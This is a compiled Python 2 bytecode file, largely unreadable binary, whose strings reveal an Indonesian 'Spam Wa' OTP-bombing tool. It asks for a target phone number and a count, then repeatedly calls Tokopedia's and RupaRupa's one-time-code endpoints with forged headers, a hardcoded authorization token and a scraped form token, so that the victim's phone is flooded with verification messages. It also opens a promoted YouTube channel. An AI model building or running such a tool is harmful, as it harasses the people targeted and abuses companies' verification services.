�
��`c           @   s�   d  d l  m Z d  d l m Z d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z e j d � d Z	 d Z
 d Z d Z d	 Z d
 Z d Z d Z d �  Z d �  Z d �  Z d �  Z d �  Z d �  Z e d k r� e �  n  d S(   i����(   t   ConnectionError(   t   sleepNt   clears   [1;31ms   [1;32ms   [1;33ms   [1;34ms   [1;35ms   [1;36ms   [1;37ms   [90mc         C   sJ   xC |  d D]7 } t  j j | � t  j j �  t t j �  d � q Wd  S(   Ns   
g�������?(   t   syst   stdoutt   writet   flushR   t   random(   t   textt   x(    (    s   exect   MesinTik   s    c         C   sJ   xC |  d D]7 } t  j j | � t  j j �  t t j �  d � q Wd  S(   Ns   
g{�G�z�?(   R   R   R   R   R   R   (   R   R	   (    (    s   exect
   MesinTik_2   s    c           C   s   t  d t d t d � d  S(   Nt    s5  

  ____                         __        __    
 / ___| _ __   __ _ _ __ ___   \ \      / /_ _ 
 \___ \| '_ \ / _` | '_ ` _ \   \ \ /\ / / _` |
  ___) | |_) | (_| | | | | | |   \ V  V / (_| |
 |____/| .__/ \__,_|_| |_| |_|    \_/\_/ \__,_|
       |_|                                     
                   s6   Creator : Jejak internet
		   Youtube : Jejak Internet(   R   t   Ct   W(    (    (    s   exect   Banner"   s    c          C   s|  Ht  t d � t  t d � Ht d t d t d t d t d t d � }  t d t d	 t d t d t d
 t d � } Ht d t d t d t d � Ht |  � } | d k  r� Ht d GHt	 j
 �  n  x�t | � D]�} yNi d d 6d d 6d d 6d d 6d d 6d d 6} i |  d 6d d 6d d  6d d! 6} i d d 6d d 6d d 6d d 6d" d# 6d$ d% 6} i |  d 6d d  6d& d' 6d d 6d( d) 6d* d+ 6} d, } d- }	 t j | d. | d/ | �}
 t j |	 d. | d/ | �} d0 | j k rHd t d1 GHPn5 d t d2 t d3 t d4 t d5 t |  t d6 GHWq� t k
 rXHt d7 GHPq� t k
 rsHt d8 GHPq� Xq� Wd  S(9   Ns   	 SPAM RUPA RUPAs   	================R   s   MASUKKAN NOMOR TARGETs    (s    Ex :s
    0812xxxx s   ) : s   JUMLAH SPAMs    3 s   -------------- t   Startings    --------------i	   s   Nomor Tidak Valid !s�   Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10s
   User-Agents   application/jsont   Accepts   https://m.ruparupa.comt   Origins!   https://m.ruparupa.com/my-accountt   Referers�   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0t   authorizationt   odis   x-company-namet   phones   jejak@gmail.comt   emailt   registert   actiont   passwords4   https://m.ruparupa.com/verification?page=otp-choicest   referers   gzip, deflate, brs   accept-encodingt   chatt   channelt   0t   customer_idi    t	   is_resends-   https://wapi.ruparupa.com/auth/check-otp-auths+   https://wapi.ruparupa.com/auth/generate-otpt   headerst   datas   tunggu 1x24 jams7   Pengiriman Sudah Limit
Silahkan Coba 1 x 24 Jam Lagi :)t   [t   *t   ]s    SPAM KE NOMOR s    BERHASIL DIKIRIMKAN !s   Cek Koneksi JaringanMu Gan !s(   Jumlah Harus Berupa Angka, Bukan Huruf !(   R
   R   R   t	   raw_inputt   Ht   inputR   t   lent   MR   t   exitt   ranget   requestst   postR   R    t	   NameError(   t   numbert   jumlaht   hitungR	   t	   headers_1t   data_1t	   headers_2t   data_2t   url_1t   url_2t	   sending_1t	   sending_2(    (    s   exect   RupaRupa-   sv    44"	



9		c          C   s.  Ht  t d � t  t d � Ht d t d t d t d t d t d � }  t d t d	 t d t d t d
 t d � } Ht d t d t d t d � Hx}t | � D]o} y/i d d 6d d 6d d 6d d 6d d 6d d 6d d 6} t j	 d |  d d | �j
 } t j d | � j d  � } i d! d" 6|  d# 6| d$ 6d d% 6d d& 6d d' 6d d( 6d) d* 6} t d+ � t j d, d | d- | �} d. | j
 k r�Hd t d/ GHPn5 d t d0 t d1 t d2 t d3 t |  t d4 GHWq� t k
 r
Ht d5 GHPq� t k
 r%Ht d6 GHPq� Xq� Wd  S(7   Ns   	 SPAM TOKOPEDIAs   	================R   s   MASUKKAN NOMOR TARGETs    (s    Ex :s
    0812xxxx s   ) : s   JUMLAH SPAMs    3 s   -------------- R   s    --------------s
   keep-alivet
   Connections.   application/json, text/javascript, */*; q=0.01R   s   https://accounts.tokopedia.comR   t   XMLHttpRequests   X-Requested-Withs   {acak}s
   User-Agents0   application/x-www-form-urlencoded; charset=UTF-8s   Content-Types   gzip, deflates   Accept-Encodings>   https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=s�   &ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253DR!   s<   \<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>i   t   116t   otp_typet   msisdnt   tkR   t   original_paramt   user_idt	   signaturet   6t   number_otp_digiti   s4   https://accounts.tokopedia.com/otp/c/ajax/request-waR"   s+   Anda sudah melakukan 3 kali pengiriman kodes:   Pengiriman Sudah Limit
Silahkan Coba 25 - 60 Menit Lagi :)R#   R$   R%   s    SPAM KE NOMOR s    BERHASIL DIKIRIMKAN !s   Cek Koneksi JaringanMu Gan !s(   Jumlah Harus Berupa Angka, Bukan Huruf !(   R
   R   R   R&   R'   R(   R   R,   R-   t   getR   t   ret   searcht   groupR   R.   R    R*   R/   (   R0   R1   R	   R!   t   siteRI   R"   t   sending(    (    s   exect   Tokped�   sZ    44"
 

9		c          C   s]  t  j d � t d t d t d GHt d � t  j d � t  j d � t d � t �  HHt d t d	 GHt d
 t d t d t d t d t d t d GHt d
 t d t d t d t d t d t d GHHyP t t d t d t d � }  |  d k rt	 �  n |  d k r0t
 �  n  Wn% t k
 rXHt d GHt j �  n Xd  S(   NR   s   Wajib SUBCRIBE s    Bro Biar Afdoll !s    :Vg      �?s=   xdg-open https://youtube.com/channel/UC905coiyi4M-g98bB3Tumdwg�������?t   MENUs    :s   	[t   1R%   s    SPAM TOKOPEDIAs    ( t   Aktifs    )t   2s    SPAM RUPA-RUPAt   NonAktifs
   PILIH MENUs    ➤ R   i   i   s,   Pilih Menu Harus Berupa Angka, Bukan Huruf !(   t   ost   systemR   R   R   R   R'   R*   R(   RM   R;   R/   R   R+   (   t   pilih(    (    s   exect   Spam�   s0    

99 

	t   __main__(   R-   R    t   timeR   R   RS   RH   R   RT   R*   R'   t   Kt   Ut   PR   R   t   AR
   R   R   R;   RM   RV   t   __name__(    (    (    s   exect   <module>   s&   <				W	@	